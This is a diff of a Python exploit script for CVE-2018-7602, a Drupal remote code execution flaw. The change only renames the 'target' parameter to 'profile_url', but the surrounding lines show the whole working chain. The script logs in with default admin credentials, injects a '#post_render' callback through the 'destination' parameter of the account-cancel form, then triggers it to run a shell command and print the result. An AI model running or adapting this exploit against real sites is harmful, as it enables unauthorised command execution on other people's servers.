@@ -16,7 +16,7 @@ class Color:
 
 color_random = [Color.IMPORTANT, Color.NOTICE, Color.OKGREEN, Color.WARNING, Color.RED, Color.END]
 
-def exploit_target(target):
+def exploit_target(profile_url):
     username = "admin"  
     password = "admin"  
     command = "id"     
@@ -33,9 +33,9 @@ def exploit_target(target):
         post_params = {'form_id': 'user_login', 'name': username, 'pass': password, 'op': 'Log in'}
         
         print(Color.OKGREEN + '[*] Attempting to log in and fetch the user ID...' + Color.END)
-        session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf)
+        session.post(profile_url, params=get_params, data=post_params, verify=False, proxies=proxyConf)
         get_params = {'q': 'user'}
-        r = session.get(target, params=get_params, verify=False, proxies=proxyConf)
+        r = session.get(profile_url, params=get_params, verify=False, proxies=proxyConf)
         
         soup = BeautifulSoup(r.text, "html.parser")
         user_id = soup.find('meta', {'property': 'foaf:name'}).get('about')
@@ -46,7 +46,7 @@ def exploit_target(target):
         
         print(Color.OKGREEN + '[*] Poisoning the form using the `destination` variable and caching it...' + Color.END)
         get_params = {'q': user_id + '/cancel'}
-        r = session.get(target, params=get_params, verify=False, proxies=proxyConf)
+        r = session.get(profile_url, params=get_params, verify=False, proxies=proxyConf)
         soup = BeautifulSoup(r.text, "html.parser")
         
         form = soup.find('form', {'id': 'user-cancel-confirm-form'})
@@ -57,7 +57,7 @@ def exploit_target(target):
             'destination': user_id + '/cancel?q[%23post_render][]=' + function + '&q[%23type]=markup&q[%23markup]=' + command
         }
         post_params = {'form_id': 'user_cancel_confirm_form', 'form_token': form_token, '_triggering_element_name': 'form_id', 'op': 'Cancel account'}
-        r = session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf)
+        r = session.post(profile_url, params=get_params, data=post_params, verify=False, proxies=proxyConf)
         
         soup = BeautifulSoup(r.text, "html.parser")
         form = soup.find('form', {'id': 'user-cancel-confirm-form'})
@@ -69,7 +69,7 @@ def exploit_target(target):
             
             get_params = {'q': 'file/ajax/actions/cancel/#options/path/' + form_build_id}
             post_params = {'form_build_id': form_build_id}
-            r = session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf)
+            r = session.post(profile_url, params=get_params, data=post_params, verify=False, proxies=proxyConf)
             
             parsed_result = r.text.split('[{"command":"settings"')[0]
             print(parsed_result)
@@ -78,6 +78,6 @@ def exploit_target(target):
         print(Color.RED + "[!] ERROR: Something went wrong during the exploit." + Color.END)
         print("Error details: %s" % str(e))
 
-def scan_cve_2018_7602(target):
+def scan_cve_2018_7602(profile_url):
 
-    exploit_target(target)
+    exploit_target(profile_url)
